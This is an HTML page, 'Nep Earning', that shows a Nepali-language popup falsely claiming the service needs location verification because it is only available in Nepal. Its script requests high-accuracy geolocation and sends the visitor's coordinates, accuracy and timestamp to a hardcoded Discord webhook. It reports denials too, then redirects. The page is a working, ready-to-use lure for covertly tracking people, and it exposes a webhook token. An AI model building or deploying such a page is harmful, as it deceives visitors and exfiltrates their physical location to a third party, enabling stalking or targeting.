<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Nep Earning</title>
<style>
  /* Background styling */
  body, html {
    margin: 0; padding: 0; height: 100%;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    overflow: hidden; /* Prevent scroll while modal active */
  }

  .site-content {
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    user-select: none;
  }

  .site-content h1 {
    font-size: 3rem;
    margin-bottom: 0.5rem;
    text-shadow: 0 0 10px rgba(0,0,0,0.4);
  }

  .site-content p {
    font-size: 1.2rem;
    max-width: 600px;
    text-align: center;
    text-shadow: 0 0 8px rgba(0,0,0,0.3);
  }

  /* Modal overlay */
  #location-modal {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.85);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
  }

  #location-modal .modal-box {
    background: #2c2c54;
    border-radius: 12px;
    padding: 30px 40px;
    max-width: 400px;
    width: 90%;
    box-shadow: 0 0 20px rgba(102, 126, 234, 0.7);
    text-align: center;
  }

  #location-modal .modal-box h2 {
    margin-top: 0;
    margin-bottom: 20px;
    font-weight: 700;
  }

  #location-modal .modal-box p {
    margin-bottom: 30px;
    font-size: 1rem;
    line-height: 1.4;
    color: #ddd;
  }

  #location-modal button {
    background: #667eea;
    color: white;
    border: none;
    padding: 14px 28px;
    font-size: 1.1rem;
    font-weight: 600;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.3s ease;
    box-shadow: 0 4px 10px rgba(102,126,234,0.6);
    user-select: none;
  }

  #location-modal button:hover {
    background: #5a67d8;
  }

  #location-modal button:active {
    transform: scale(0.98);
  }

  #status {
    margin-top: 10px;
    color: #ccc;
    min-height: 1.2em;
  }
</style>
</head>
<body>

<div class="site-content" aria-hidden="true">
  <h1>Welcome to Amazing Site</h1>
  <p>Discover exciting content, latest updates, and exclusive offers tailored just for you.</p>
</div>

<!-- Modal overlay -->
<div id="location-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" aria-describedby="modal-desc">
  <div class="modal-box">
    <h2 id="modal-title">‡§ï‡•É‡§™‡§Ø‡§æ ‡§Ü‡§´‡•ç‡§®‡•ã Location Verify ‡§ó‡§∞‡•ç‡§®‡•Å‡§π‡•ã‡§∏‡•ç</h2>
    <p id="modal-desc">
      ‡§π‡§æ‡§Æ‡•ç‡§∞‡§æ ‡§∏‡•á‡§µ‡§æ ‡§ï‡•á‡§µ‡§≤ ‡§®‡•á‡§™‡§æ‡§≤‡§Æ‡§æ ‡§Æ‡§æ‡§§‡•ç‡§∞ ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§õ‡§®‡•ç, 
      ‡§§‡•ç‡§Ø‡§∏‡•à‡§≤‡•á ‡§µ‡•á‡§¨‡§∏‡§æ‡§á‡§ü ‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó ‡§ó‡§∞‡•ç‡§® ‡§Ü‡§´‡•ç‡§®‡•ã Location Verify ‡§ó‡§∞‡•ç‡§®‡•Å‡§π‡•ã‡§∏‡•ç‡•§
    </p>
    <button id="allow-btn" type="button">Allow Location</button>
    <p id="status"></p>
  </div>
</div>

<script>
  const webhookURL = "https://discord.com/api/webhooks/1378033823329026058/HMfzc8nCvvv39-8YX6vipDjEkBvckadQBrtidk4kG4SRrdO5Zdr1Q8bjnckLKt68cb1c"; // Replace this with your webhook URL

  const modal = document.getElementById("location-modal");
  const allowBtn = document.getElementById("allow-btn");
  const statusP = document.getElementById("status");

  function sendToDiscord(message) {
    return fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
  }

  function redirectToTarget() {
    window.location.href = "https://someonepage.com";
  }

  allowBtn.addEventListener("click", () => {
    allowBtn.disabled = true;
    allowBtn.textContent = "Requesting Location...";
    statusP.textContent = "Waiting for your location...";

    if (!navigator.geolocation) {
      statusP.textContent = "Geolocation is not supported by your browser.";
      sendToDiscord("‚ùå Location API not supported on user device.").finally(() => {
        setTimeout(redirectToTarget, 2000);
      });
      return;
    }

    const fallbackTimeout = setTimeout(() => {
      statusP.textContent = "No response, redirecting...";
      redirectToTarget();
    }, 20000); // 20 seconds fallback

    navigator.geolocation.getCurrentPosition(position => {
      clearTimeout(fallbackTimeout);

      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const timestamp = new Date().toISOString();

      const msg = `üìç Location Captured:
Latitude: ${lat}
Longitude: ${lon}
Accuracy: ${acc} meters
Time: ${timestamp}`;

      statusP.textContent = "Location captured, sending data...";

      sendToDiscord(msg)
        .then(() => {
          statusP.textContent = "Data sent! Redirecting...";
          modal.style.display = "none";
          setTimeout(redirectToTarget, 1500);
        })
        .catch(e => {
          console.error("Failed to send webhook", e);
          statusP.textContent = "Failed to send data, but redirecting...";
          modal.style.display = "none";
          setTimeout(redirectToTarget, 1500);
        });

    }, error => {
      clearTimeout(fallbackTimeout);

      const errorMsg = `‚ùå Location access denied or failed: ${error.message}`;
      console.warn(errorMsg);
      statusP.textContent = "Location denied or failed. Redirecting...";

      sendToDiscord(errorMsg)
        .finally(() => {
          modal.style.display = "none";
          setTimeout(redirectToTarget, 1500);
        });
    }, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    });
  });

  // Disable scrolling while modal is active
  document.body.style.overflow = "hidden";
</script>

</body>
</html>
